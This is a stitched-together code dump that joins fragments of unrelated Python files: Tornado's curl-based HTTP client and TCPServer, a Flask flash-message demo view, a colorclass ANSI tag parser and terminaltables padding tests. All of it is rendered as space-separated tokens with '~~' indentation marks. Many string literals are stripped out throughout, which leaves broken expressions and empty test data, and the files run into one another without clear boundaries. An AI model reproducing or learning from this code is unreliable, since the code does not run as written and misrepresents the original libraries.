( request , callback ) = self . _requests . popleft ( ) \n 
curl . info = { \n 
"headers" : httputil . HTTPHeaders ( ) , \n 
"buffer" : BytesIO ( ) , \n 
"request" : request , \n 
"callback" : callback , \n 
"curl_start_time" : time . time ( ) , \n 
} \n 
_curl_setup_request ( curl , request , curl . info [ "buffer" ] , \n 
curl . info [ "headers" ] ) \n 
self . _multi . add_handle ( curl ) \n 
\n 
~~ if not started : \n 
~~~ break \n 
\n 
~~ ~~ ~~ ~~ def _finish ( self , curl , curl_error = None , curl_message = None ) : \n 
~~~ info = curl . info \n 
curl . info = None \n 
self . _multi . remove_handle ( curl ) \n 
self . _free_list . append ( curl ) \n 
buffer = info [ "buffer" ] \n 
if curl_error : \n 
~~~ error = CurlError ( curl_error , curl_message ) \n 
code = error . code \n 
effective_url = None \n 
buffer . close ( ) \n 
buffer = None \n 
~~ else : \n 
~~~ error = None \n 
code = curl . getinfo ( pycurl . HTTP_CODE ) \n 
effective_url = curl . getinfo ( pycurl . EFFECTIVE_URL ) \n 
buffer . seek ( 0 ) \n 
# the various curl timings are documented at \n 
# http://curl.haxx.se/libcurl/c/curl_easy_getinfo.html \n 
~~ time_info = dict ( \n 
queue = info [ "curl_start_time" ] - info [ "request" ] . start_time , \n 
namelookup = curl . getinfo ( pycurl . NAMELOOKUP_TIME ) , \n 
connect = curl . getinfo ( pycurl . CONNECT_TIME ) , \n 
pretransfer = curl . getinfo ( pycurl . PRETRANSFER_TIME ) , \n 
starttransfer = curl . getinfo ( pycurl . STARTTRANSFER_TIME ) , \n 
total = curl . getinfo ( pycurl . TOTAL_TIME ) , \n 
redirect = curl . getinfo ( pycurl . REDIRECT_TIME ) , \n 
) \n 
try : \n 
~~~ info [ "callback" ] ( HTTPResponse ( \n 
request = info [ "request" ] , code = code , headers = info [ "headers" ] , \n 
buffer = buffer , effective_url = effective_url , error = error , \n 
reason = info [ ] . get ( "X-Http-Reason" , None ) , \n 
request_time = time . time ( ) - info [ "curl_start_time" ] , \n 
time_info = time_info ) ) \n 
~~ except Exception : \n 
~~~ self . handle_callback_exception ( info [ "callback" ] ) \n 
\n 
~~ ~~ def handle_callback_exception ( self , callback ) : \n 
~~~ self . io_loop . handle_callback_exception ( callback ) \n 
\n 
\n 
~~ ~~ class CurlError ( HTTPError ) : \n 
~~~ def __init__ ( self , errno , message ) : \n 
~~~ HTTPError . __init__ ( self , 599 , message ) \n 
self . errno = errno \n 
\n 
\n 
~~ ~~ def _curl_create ( ) : \n 
~~~ curl = pycurl . Curl ( ) \n 
if gen_log . isEnabledFor ( logging . DEBUG ) : \n 
~~~ curl . setopt ( pycurl . VERBOSE , 1 ) \n 
curl . setopt ( pycurl . DEBUGFUNCTION , _curl_debug ) \n 
~~ return curl \n 
\n 
\n 
~~ def _curl_setup_request ( curl , request , buffer , headers ) : \n 
~~~ curl . setopt ( pycurl . URL , native_str ( request . url ) ) \n 
\n 
# libcurl\'s magic "Expect: 100-continue" behavior causes delays \n 
\n 
\n 
# a bug in conjunction with the curl_multi_socket_action API \n 
# (https://sourceforge.net/tracker/?func=detail&atid=100976&aid=3039744&group_id=976), \n 
\n 
# so just turn off the feature (yes, setting Expect: to an empty \n 
# value is the official way to disable this) \n 
if "Expect" not in request . headers : \n 
~~~ request . headers [ "Expect" ] = "" \n 
\n 
# libcurl adds Pragma: no-cache by default; disable that too \n 
~~ if "Pragma" not in request . headers : \n 
~~~ request . headers [ "Pragma" ] = "" \n 
\n 
# Request headers may be either a regular dict or HTTPHeaders object \n 
~~ if isinstance ( request . headers , httputil . HTTPHeaders ) : \n 
~~~ curl . setopt ( pycurl . HTTPHEADER , \n 
[ native_str ( "%s: %s" % i ) for i in request . headers . get_all ( ) ] ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . HTTPHEADER , \n 
[ native_str ( "%s: %s" % i ) for i in request . headers . items ( ) ] ) \n 
\n 
~~ if request . header_callback : \n 
~~~ curl . setopt ( pycurl . HEADERFUNCTION , \n 
lambda line : request . header_callback ( native_str ( line ) ) ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . HEADERFUNCTION , \n 
lambda line : _curl_header_callback ( headers , \n 
native_str ( line ) ) ) \n 
~~ if request . streaming_callback : \n 
~~~ write_function = request . streaming_callback \n 
~~ else : \n 
~~~ write_function = buffer . write \n 
~~ if bytes_type is str : # py2 \n 
~~~ curl . setopt ( pycurl . WRITEFUNCTION , write_function ) \n 
~~ else : # py3 \n 
\n 
# a fork/port.  That version has a bug in which it passes unicode \n 
# strings instead of bytes to the WRITEFUNCTION.  This means that \n 
# if you use a WRITEFUNCTION (which tornado always does), you cannot \n 
# download arbitrary binary data.  This needs to be fixed in the \n 
# ported pycurl package, but in the meantime this lambda will \n 
# make it work for downloading (utf8) text. \n 
~~~ curl . setopt ( pycurl . WRITEFUNCTION , lambda s : write_function ( utf8 ( s ) ) ) \n 
~~ curl . setopt ( pycurl . FOLLOWLOCATION , request . follow_redirects ) \n 
curl . setopt ( pycurl . MAXREDIRS , request . max_redirects ) \n 
curl . setopt ( pycurl . CONNECTTIMEOUT_MS , int ( 1000 * request . connect_timeout ) ) \n 
curl . setopt ( pycurl . TIMEOUT_MS , int ( 1000 * request . request_timeout ) ) \n 
if request . user_agent : \n 
~~~ curl . setopt ( pycurl . USERAGENT , native_str ( request . user_agent ) ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . USERAGENT , "Mozilla/5.0 (compatible; pycurl)" ) \n 
~~ if request . network_interface : \n 
~~~ curl . setopt ( pycurl . INTERFACE , request . network_interface ) \n 
~~ if request . decompress_response : \n 
~~~ curl . setopt ( pycurl . ENCODING , "gzip,deflate" ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . ENCODING , "none" ) \n 
~~ if request . proxy_host and request . proxy_port : \n 
~~~ curl . setopt ( pycurl . PROXY , request . proxy_host ) \n 
curl . setopt ( pycurl . PROXYPORT , request . proxy_port ) \n 
if request . proxy_username : \n 
~~~ credentials = % ( request . proxy_username , \n 
request . proxy_password ) \n 
curl . setopt ( pycurl . PROXYUSERPWD , credentials ) \n 
~~ ~~ else : \n 
~~~ curl . setopt ( pycurl . PROXY , ) \n 
curl . unsetopt ( pycurl . PROXYUSERPWD ) \n 
~~ if request . validate_cert : \n 
~~~ curl . setopt ( pycurl . SSL_VERIFYPEER , 1 ) \n 
curl . setopt ( pycurl . SSL_VERIFYHOST , 2 ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . SSL_VERIFYPEER , 0 ) \n 
curl . setopt ( pycurl . SSL_VERIFYHOST , 0 ) \n 
~~ if request . ca_certs is not None : \n 
~~~ curl . setopt ( pycurl . CAINFO , request . ca_certs ) \n 
~~ else : \n 
# There is no way to restore pycurl.CAINFO to its default value \n 
# (Using unsetopt makes it reject all certificates). \n 
\n 
\n 
# if no ca_certs file was specified, and require that if any \n 
# request uses a custom ca_certs file, they all must. \n 
~~~ pass \n 
\n 
~~ if request . allow_ipv6 is False : \n 
# Curl behaves reasonably when DNS resolution gives an ipv6 address \n 
\n 
~~~ curl . setopt ( pycurl . IPRESOLVE , pycurl . IPRESOLVE_V4 ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . IPRESOLVE , pycurl . IPRESOLVE_WHATEVER ) \n 
\n 
\n 
# up names for almost every single method \n 
~~ curl_options = { \n 
"GET" : pycurl . HTTPGET , \n 
"POST" : pycurl . POST , \n 
"PUT" : pycurl . UPLOAD , \n 
"HEAD" : pycurl . NOBODY , \n 
} \n 
custom_methods = set ( [ "DELETE" , "OPTIONS" , "PATCH" ] ) \n 
for o in curl_options . values ( ) : \n 
~~~ curl . setopt ( o , False ) \n 
~~ if request . method in curl_options : \n 
~~~ curl . unsetopt ( pycurl . CUSTOMREQUEST ) \n 
curl . setopt ( curl_options [ request . method ] , True ) \n 
~~ elif request . allow_nonstandard_methods or request . method in custom_methods : \n 
~~~ curl . setopt ( pycurl . CUSTOMREQUEST , request . method ) \n 
~~ else : \n 
~~~ raise KeyError ( + request . method ) \n 
\n 
\n 
~~ if request . method in ( "POST" , "PUT" ) : \n 
~~~ if request . body is None : \n 
~~~ raise AssertionError ( \n 
\'Body must not be empty for "%s" request\' \n 
% request . method ) \n 
\n 
~~ request_buffer = BytesIO ( utf8 ( request . body ) ) \n 
curl . setopt ( pycurl . READFUNCTION , request_buffer . read ) \n 
if request . method == "POST" : \n 
~~~ def ioctl ( cmd ) : \n 
~~~ if cmd == curl . IOCMD_RESTARTREAD : \n 
~~~ request_buffer . seek ( 0 ) \n 
~~ ~~ curl . setopt ( pycurl . IOCTLFUNCTION , ioctl ) \n 
curl . setopt ( pycurl . POSTFIELDSIZE , len ( request . body ) ) \n 
~~ else : \n 
~~~ curl . setopt ( pycurl . INFILESIZE , len ( request . body ) ) \n 
~~ ~~ elif request . method == "GET" : \n 
~~~ if request . body is not None : \n 
~~~ raise AssertionError ( ) \n 
\n 
~~ ~~ if request . auth_username is not None : \n 
~~~ userpwd = "%s:%s" % ( request . auth_username , request . auth_password or ) \n 
\n 
if request . auth_mode is None or request . auth_mode == "basic" : \n 
~~~ curl . setopt ( pycurl . HTTPAUTH , pycurl . HTTPAUTH_BASIC ) \n 
~~ elif request . auth_mode == "digest" : \n 
~~~ curl . setopt ( pycurl . HTTPAUTH , pycurl . HTTPAUTH_DIGEST ) \n 
~~ else : \n 
~~~ raise ValueError ( "Unsupported auth_mode %s" % request . auth_mode ) \n 
\n 
~~ curl . setopt ( pycurl . USERPWD , native_str ( userpwd ) ) \n 
gen_log . debug ( "%s %s (username: %r)" , request . method , request . url , \n 
request . auth_username ) \n 
~~ else : \n 
~~~ curl . unsetopt ( pycurl . USERPWD ) \n 
gen_log . debug ( "%s %s" , request . method , request . url ) \n 
\n 
~~ if request . client_cert is not None : \n 
~~~ curl . setopt ( pycurl . SSLCERT , request . client_cert ) \n 
\n 
~~ if request . client_key is not None : \n 
~~~ curl . setopt ( pycurl . SSLKEY , request . client_key ) \n 
\n 
~~ if threading . activeCount ( ) > 1 : \n 
# libcurl/pycurl is not thread-safe by default.  When multiple threads \n 
# are used, signals should be disabled.  This has the side effect \n 
# of disabling DNS timeouts in some environments (when libcurl is \n 
\n 
# thread.  Applications that use many short-lived threads may need \n 
# to set NOSIGNAL manually in a prepare_curl_callback since \n 
# there may not be any other threads running at the time we call \n 
# threading.activeCount. \n 
~~~ curl . setopt ( pycurl . NOSIGNAL , 1 ) \n 
~~ if request . prepare_curl_callback is not None : \n 
~~~ request . prepare_curl_callback ( curl ) \n 
\n 
\n 
~~ ~~ def _curl_header_callback ( headers , header_line ) : \n 
# header_line as returned by curl includes the end-of-line characters. \n 
~~~ header_line = header_line . strip ( ) \n 
if header_line . startswith ( "HTTP/" ) : \n 
~~~ headers . clear ( ) \n 
try : \n 
~~~ ( __ , __ , reason ) = httputil . parse_response_start_line ( header_line ) \n 
header_line = "X-Http-Reason: %s" % reason \n 
~~ except httputil . HTTPInputError : \n 
~~~ return \n 
~~ ~~ if not header_line : \n 
~~~ return \n 
~~ headers . parse_line ( header_line ) \n 
\n 
\n 
~~ def _curl_debug ( debug_type , debug_msg ) : \n 
~~~ debug_types = ( , , , , ) \n 
if debug_type == 0 : \n 
~~~ gen_log . debug ( , debug_msg . strip ( ) ) \n 
~~ elif debug_type in ( 1 , 2 ) : \n 
~~~ for line in debug_msg . splitlines ( ) : \n 
~~~ gen_log . debug ( , debug_types [ debug_type ] , line ) \n 
~~ ~~ elif debug_type == 4 : \n 
~~~ gen_log . debug ( , debug_types [ debug_type ] , debug_msg ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ AsyncHTTPClient . configure ( CurlAsyncHTTPClient ) \n 
main ( ) \n 
#!/usr/bin/env python \n 
# \n 
# Copyright 2011 Facebook \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ """A non-blocking, single-threaded TCP server.""" \n 
from __future__ import absolute_import , division , print_function , with_statement \n 
\n 
import errno \n 
import os \n 
import socket \n 
\n 
from tornado . log import app_log \n 
from tornado . ioloop import IOLoop \n 
from tornado . iostream import IOStream , SSLIOStream \n 
from tornado . netutil import bind_sockets , add_accept_handler , ssl_wrap_socket \n 
from tornado import process \n 
from tornado . util import errno_from_exception \n 
\n 
try : \n 
~~~ import ssl \n 
~~ except ImportError : \n 
# ssl is not available on Google App Engine. \n 
~~~ ssl = None \n 
\n 
\n 
~~ class TCPServer ( object ) : \n 
~~~ r"""A non-blocking, single-threaded TCP server.\n\n    To use `TCPServer`, define a subclass which overrides the `handle_stream`\n    method.\n\n    To make this server serve SSL traffic, send the ssl_options dictionary\n    argument with the arguments required for the `ssl.wrap_socket` method,\n    including "certfile" and "keyfile"::\n\n       TCPServer(ssl_options={\n           "certfile": os.path.join(data_dir, "mydomain.crt"),\n           "keyfile": os.path.join(data_dir, "mydomain.key"),\n       })\n\n    `TCPServer` initialization follows one of three patterns:\n\n    1. `listen`: simple single-process::\n\n            server = TCPServer()\n            server.listen(8888)\n            IOLoop.instance().start()\n\n    2. `bind`/`start`: simple multi-process::\n\n            server = TCPServer()\n            server.bind(8888)\n            server.start(0)  # Forks multiple sub-processes\n            IOLoop.instance().start()\n\n       When using this interface, an `.IOLoop` must *not* be passed\n       to the `TCPServer` constructor.  `start` will always start\n       the server on the default singleton `.IOLoop`.\n\n    3. `add_sockets`: advanced multi-process::\n\n            sockets = bind_sockets(8888)\n            tornado.process.fork_processes(0)\n            server = TCPServer()\n            server.add_sockets(sockets)\n            IOLoop.instance().start()\n\n       The `add_sockets` interface is more complicated, but it can be\n       used with `tornado.process.fork_processes` to give you more\n       flexibility in when the fork happens.  `add_sockets` can\n       also be used in single-process servers if you want to create\n       your listening sockets in some way other than\n       `~tornado.netutil.bind_sockets`.\n\n    .. versionadded:: 3.1\n       The ``max_buffer_size`` argument.\n    """ \n 
def __init__ ( self , io_loop = None , ssl_options = None , max_buffer_size = None , \n 
read_chunk_size = None ) : \n 
~~~ self . io_loop = io_loop \n 
self . ssl_options = ssl_options \n 
self . _sockets = { } # fd -> socket object \n 
self . _pending_sockets = [ ] \n 
self . _started = False \n 
self . max_buffer_size = max_buffer_size \n 
self . read_chunk_size = None \n 
\n 
\n 
\n 
\n 
# which seems like too much work \n 
if self . ssl_options is not None and isinstance ( self . ssl_options , dict ) : \n 
# Only certfile is required: it can contain both keys \n 
~~~ if not in self . ssl_options : \n 
~~~ raise KeyError ( \'missing key "certfile" in ssl_options\' ) \n 
\n 
~~ if not os . path . exists ( self . ssl_options [ ] ) : \n 
~~~ raise ValueError ( \'certfile "%s" does not exist\' % \n 
self . ssl_options [ ] ) \n 
~~ if ( in self . ssl_options and \n 
not os . path . exists ( self . ssl_options [ ] ) ) : \n 
~~~ raise ValueError ( \'keyfile "%s" does not exist\' % \n 
self . ssl_options [ ] ) \n 
\n 
~~ ~~ ~~ def listen ( self , port , address = "" ) : \n 
~~~ """Starts accepting connections on the given port.\n\n        This method may be called more than once to listen on multiple ports.\n        `listen` takes effect immediately; it is not necessary to call\n        `TCPServer.start` afterwards.  It is, however, necessary to start\n        the `.IOLoop`.\n        """ \n 
sockets = bind_sockets ( port , address = address ) \n 
self . add_sockets ( sockets ) \n 
\n 
~~ def add_sockets ( self , sockets ) : \n 
~~~ """Makes this server start accepting connections on the given sockets.\n\n        The ``sockets`` parameter is a list of socket objects such as\n        those returned by `~tornado.netutil.bind_sockets`.\n        `add_sockets` is typically used in combination with that\n        method and `tornado.process.fork_processes` to provide greater\n        control over the initialization of a multi-process server.\n        """ \n 
if self . io_loop is None : \n 
~~~ self . io_loop = IOLoop . current ( ) \n 
\n 
~~ for sock in sockets : \n 
~~~ self . _sockets [ sock . fileno ( ) ] = sock \n 
add_accept_handler ( sock , self . _handle_connection , \n 
io_loop = self . io_loop ) \n 
\n 
~~ ~~ def add_socket ( self , socket ) : \n 
~~~ """Singular version of `add_sockets`.  Takes a single socket object.""" \n 
self . add_sockets ( [ socket ] ) \n 
\n 
~~ def bind ( self , port , address = None , family = socket . AF_UNSPEC , backlog = 128 ) : \n 
~~~ """Binds this server to the given port on the given address.\n\n        To start the server, call `start`. If you want to run this server\n        in a single process, you can call `listen` as a shortcut to the\n        sequence of `bind` and `start` calls.\n\n        Address may be either an IP address or hostname.  If it\'s a hostname,\n        the server will listen on all IP addresses associated with the\n        name.  Address may be an empty string or None to listen on all\n        available interfaces.  Family may be set to either `socket.AF_INET`\n        or `socket.AF_INET6` to restrict to IPv4 or IPv6 addresses, otherwise\n        both will be used if available.\n\n        The ``backlog`` argument has the same meaning as for\n        `socket.listen <socket.socket.listen>`.\n\n        This method may be called multiple times prior to `start` to listen\n        on multiple ports or interfaces.\n        """ \n 
sockets = bind_sockets ( port , address = address , family = family , \n 
backlog = backlog ) \n 
if self . _started : \n 
~~~ self . add_sockets ( sockets ) \n 
~~ else : \n 
~~~ self . _pending_sockets . extend ( sockets ) \n 
\n 
~~ ~~ def start ( self , num_processes = 1 ) : \n 
~~~ """Starts this server in the `.IOLoop`.\n\n        By default, we run the server in this process and do not fork any\n        additional child process.\n\n        If num_processes is ``None`` or <= 0, we detect the number of cores\n        available on this machine and fork that number of child\n        processes. If num_processes is given and > 1, we fork that\n        specific number of sub-processes.\n\n        Since we use processes and not threads, there is no shared memory\n        between any server code.\n\n        Note that multiple processes are not compatible with the autoreload\n        module (or the ``autoreload=True`` option to `tornado.web.Application`\n        which defaults to True when ``debug=True``).\n        When using multiple processes, no IOLoops can be created or\n        referenced until after the call to ``TCPServer.start(n)``.\n        """ \n 
assert not self . _started \n 
self . _started = True \n 
if num_processes != 1 : \n 
~~~ process . fork_processes ( num_processes ) \n 
~~ sockets = self . _pending_sockets \n 
self . _pending_sockets = [ ] \n 
self . add_sockets ( sockets ) \n 
\n 
~~ def stop ( self ) : \n 
~~~ """Stops listening for new connections.\n\n        Requests currently in progress may still continue after the\n        server is stopped.\n        """ \n 
for fd , sock in self . _sockets . items ( ) : \n 
~~~ self . io_loop . remove_handler ( fd ) \n 
sock . close ( ) \n 
\n 
~~ ~~ def handle_stream ( self , stream , address ) : \n 
~~~ """Override to handle a new `.IOStream` from an incoming connection.""" \n 
raise NotImplementedError ( ) \n 
\n 
~~ def _handle_connection ( self , connection , address ) : \n 
~~~ if self . ssl_options is not None : \n 
~~~ assert ssl , "Python 2.6+ and OpenSSL required for SSL" \n 
try : \n 
~~~ connection = ssl_wrap_socket ( connection , \n 
self . ssl_options , \n 
server_side = True , \n 
do_handshake_on_connect = False ) \n 
~~ except ssl . SSLError as err : \n 
~~~ if err . args [ 0 ] == ssl . SSL_ERROR_EOF : \n 
~~~ return connection . close ( ) \n 
~~ else : \n 
~~~ raise \n 
~~ ~~ except socket . error as err : \n 
# If the connection is closed immediately after it is created \n 
# (as in a port scan), we can get one of several errors. \n 
# wrap_socket makes an internal call to getpeername, \n 
# which may return either EINVAL (Mac OS X) or ENOTCONN \n 
# (Linux).  If it returns ENOTCONN, this error is \n 
# silently swallowed by the ssl module, so we need to \n 
# catch another error later on (AttributeError in \n 
# SSLIOStream._do_ssl_handshake). \n 
# To test this behavior, try nmap with the -sT flag. \n 
# https://github.com/tornadoweb/tornado/pull/750 \n 
~~~ if errno_from_exception ( err ) in ( errno . ECONNABORTED , errno . EINVAL ) : \n 
~~~ return connection . close ( ) \n 
~~ else : \n 
~~~ raise \n 
~~ ~~ ~~ try : \n 
~~~ if self . ssl_options is not None : \n 
~~~ stream = SSLIOStream ( connection , io_loop = self . io_loop , \n 
max_buffer_size = self . max_buffer_size , \n 
read_chunk_size = self . read_chunk_size ) \n 
~~ else : \n 
~~~ stream = IOStream ( connection , io_loop = self . io_loop , \n 
max_buffer_size = self . max_buffer_size , \n 
read_chunk_size = self . read_chunk_size ) \n 
~~ self . handle_stream ( stream , address ) \n 
~~ except Exception : \n 
~~~ app_log . error ( "Error in connection callback" , exc_info = True ) \n 
~~ ~~ ~~ from textwrap import dedent \n 
\n 
from flask import abort , redirect , render_template , request , url_for \n 
\n 
from pypi_portal . core import flash \n 
from pypi_portal . blueprints import examples_alerts \n 
\n 
\n 
@ examples_alerts . route ( ) \n 
def index ( ) : \n 
~~~ return render_template ( ) \n 
\n 
\n 
~~ @ examples_alerts . route ( ) \n 
def modal ( ) : \n 
~~~ """Push flash message to stack, then redirect back to index().""" \n 
message_size = request . args . get ( ) \n 
flash_count = request . args . get ( ) \n 
flash_type = request . args . get ( ) \n 
\n 
# First check if requested type/count are valid. \n 
available_types = [ k for k , v in flash . __dict__ . items ( ) if callable ( v ) ] \n 
if flash_type not in available_types : \n 
~~~ abort ( 400 ) \n 
~~ if not str ( flash_count ) . isdigit ( ) or not ( 1 <= int ( flash_count ) <= 10 ) : \n 
~~~ abort ( 400 ) \n 
\n 
# Build message. \n 
~~ if message_size == : \n 
~~~ message = dedent ( """\\\n        Traceback (most recent call last):\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/tornado/web.py", line 1309, in _execute\n            result = self.prepare()\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/tornado/web.py", line 2498, in prepare\n            self.fallback(self.request)\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/tornado/wsgi.py", line 280, in __call__\n            WSGIContainer.environ(request), start_response)\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask/app.py", line 1836, in __call__\n            return self.wsgi_app(environ, start_response)\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask/app.py", line 1820, in wsgi_app\n            response = self.make_response(self.handle_exception(e))\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask/app.py", line 1410, in handle_exception\n            return handler(e)\n          File "/Users/robpol86/workspace/Flask-Large-Application-Example/pypi_portal/middleware.py", line 56, in error_handler\n            send_exception(\'{} exception in {}\'.format(exception_name, view_module))\n          File "/Users/robpol86/workspace/Flask-Large-Application-Example/pypi_portal/core/email.py", line 77, in send_exception\n            mail.send(msg)\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask_mail.py", line 415, in send\n            with self.connect() as connection:\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask_mail.py", line 123, in __enter__\n            self.host = self.configure_host()\n          File "/Users/robpol86/virtualenvs/Flask-Large-App/lib/python2.7/site-packages/flask_mail.py", line 137, in configure_host\n            host = smtplib.SMTP(self.mail.server, self.mail.port)\n          File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/smtplib.py", line 251, in __init__\n            (code, msg) = self.connect(host, port)\n          File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/smtplib.py", line 311, in connect\n            self.sock = self._get_socket(host, port, self.timeout)\n          File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/smtplib.py", line 286, in _get_socket\n            return socket.create_connection((host, port), timeout)\n          File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/socket.py", line 553, in create_connection\n            for res in getaddrinfo(host, port, 0, SOCK_STREAM):\n        gaierror: [Errno 8] nodename nor servname provided, or not known\\\n        """ ) \n 
~~ elif message_size == : \n 
~~~ message = ( "Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: " \n 
"None is the `nil\' object;&nbsp;<script>Ellipsis represents `...\' in slices." ) \n 
~~ else : \n 
~~~ message = \n 
\n 
# Push to flash stack, then redirect. \n 
~~ func = getattr ( flash , flash_type ) \n 
for i in range ( int ( flash_count ) ) : \n 
~~~ func ( message ) \n 
~~ return redirect ( url_for ( ) ) \n 
~~ """Parse color markup tags into ANSI escape sequences.""" \n 
\n 
import re \n 
\n 
from colorclass . codes import ANSICodeMapping , BASE_CODES \n 
\n 
CODE_GROUPS = ( \n 
tuple ( set ( str ( i ) for i in BASE_CODES . values ( ) if i and ( 40 <= i <= 49 or 100 <= i <= 109 ) ) ) , # bg colors tuple ( set ( str ( i ) for i in BASE_CODES . values ( ) if i and ( 30 <= i <= 39 or 90 <= i <= 99 ) ) ) , # fg colors ( , ) , ( , ) , ( , ) , ( , ) , ( , ) , ( , ) , ( , ) , ( , ) \n 
RE_ANSI = re . compile ( ) \n 
RE_COMBINE = re . compile ( ) \n 
RE_SPLIT = re . compile ( ) \n 
\n 
\n 
def prune_overridden ( ansi_string ) : \n 
~~~ """Remove color codes that are rendered ineffective by subsequent codes in one escape sequence then sort codes.\n\n    :param str ansi_string: Incoming ansi_string with ANSI color codes.\n\n    :return: Color string with pruned color sequences.\n    :rtype: str\n    """ \n 
multi_seqs = set ( p for p in RE_ANSI . findall ( ansi_string ) if in p [ 1 ] ) # Sequences with multiple color codes. \n 
for escape , codes in multi_seqs : \n 
~~~ r_codes = list ( reversed ( codes . split ( ) ) ) \n 
\n 
# Nuke everything before {/all}. \n 
try : \n 
~~~ r_codes = r_codes [ : r_codes . index ( ) + 1 ] \n 
~~ except ValueError : \n 
~~~ pass \n 
\n 
# Thin out groups. \n 
~~ for group in CODE_GROUPS : \n 
~~~ for pos in reversed ( [ i for i , n in enumerate ( r_codes ) if n in group ] [ 1 : ] ) : \n 
~~~ r_codes . pop ( pos ) \n 
\n 
# Done. \n 
~~ ~~ reduced_codes = . join ( sorted ( r_codes , key = int ) ) \n 
if codes != reduced_codes : \n 
~~~ ansi_string = ansi_string . replace ( escape , + reduced_codes + ) \n 
\n 
~~ ~~ return ansi_string \n 
\n 
\n 
~~ def parse_input ( tagged_string , disable_colors ) : \n 
~~~ """Perform the actual conversion of tags to ANSI escaped codes.\n\n    Provides a version of the input without any colors for len() and other methods.\n\n    :param str tagged_string: The input unicode value.\n    :param bool disable_colors: Strip all colors in both outputs.\n\n    :return: 2-item tuple. First item is the parsed output. Second item is a version of the input without any colors.\n    :rtype: tuple\n    """ \n 
codes = ANSICodeMapping ( tagged_string ) \n 
output_colors = getattr ( tagged_string , , tagged_string ) \n 
\n 
\n 
for tag , replacement in ( ( + k + , if v is None else % v ) for k , v in codes . ~~~ output_colors = output_colors . replace ( tag , replacement ) \n 
\n 
# Strip colors. \n 
~~ output_no_colors = RE_ANSI . sub ( , output_colors ) \n 
if disable_colors : \n 
~~~ return output_no_colors , output_no_colors \n 
\n 
\n 
~~ while True : \n 
~~~ simplified = RE_COMBINE . sub ( , output_colors ) \n 
if simplified == output_colors : \n 
~~~ break \n 
~~ output_colors = simplified \n 
\n 
\n 
~~ output_colors = prune_overridden ( output_colors ) \n 
\n 
\n 
previous_escape = None \n 
segments = list ( ) \n 
for item in ( i for i in RE_SPLIT . split ( output_colors ) if i ) : \n 
~~~ if RE_SPLIT . match ( item ) : \n 
~~~ if item != previous_escape : \n 
~~~ segments . append ( item ) \n 
previous_escape = item \n 
~~ ~~ else : \n 
~~~ segments . append ( item ) \n 
~~ ~~ output_colors = . join ( segments ) \n 
\n 
return output_colors , output_no_colors \n 
~~ """Test padding cells.""" \n 
\n 
import pytest \n 
\n 
from terminaltables . tables import AsciiTable , UnixTable \n 
\n 
\n 
@ pytest . mark . parametrize ( , [ AsciiTable , UnixTable ] ) \n 
def test_empty ( cls ) : \n 
~~~ """Test on empty tables.""" \n 
table = cls ( [ ] ) \n 
assert table . padded_table_data == [ ] \n 
\n 
table = cls ( [ [ ] ] ) \n 
assert table . padded_table_data == [ [ ] ] \n 
\n 
table = cls ( [ [ ] ] ) \n 
assert table . padded_table_data == [ [ ] ] \n 
\n 
table = cls ( [ [ ] ] ) \n 
assert table . padded_table_data == [ [ ] ] \n 
\n 
\n 
~~ @ pytest . mark . parametrize ( , [ AsciiTable , UnixTable ] ) \n 
def test_simple ( cls ) : \n 
~~~ """Test on simple tables.""" \n 
table_data = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
] \n 
table = cls ( table_data ) \n 
\n 
expected = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
] \n 
assert table . padded_table_data == expected \n 
\n 
table_data . append ( [ , ] ) \n 
table_data . append ( [ ] ) \n 
expected = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
] \n 
assert table . padded_table_data == expected \n 
\n 
\n 
~~ @ pytest . mark . parametrize ( , [ AsciiTable , UnixTable ] ) \n 
def test_attributes ( cls ) : \n 
~~~ """Test padding on different text justifications.""" \n 
table_data = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , ] \n 
] \n 
table = cls ( table_data ) \n 
\n 
table . justify_columns [ 0 ] = \n 
expected = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] \n 
] \n 
assert table . padded_table_data == expected \n 
\n 
table . justify_columns [ 2 ] = \n 
expected = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] \n 
] \n 
assert table . padded_table_data == expected \n 
\n 
\n 
~~ @ pytest . mark . parametrize ( , [ AsciiTable , UnixTable ] ) \n 
def test_multi_line ( cls ) : \n 
~~~ """Test on multi-line tables.""" \n 
table_data = [ \n 
[ , , ] , \n 
[ , , ] , \n 
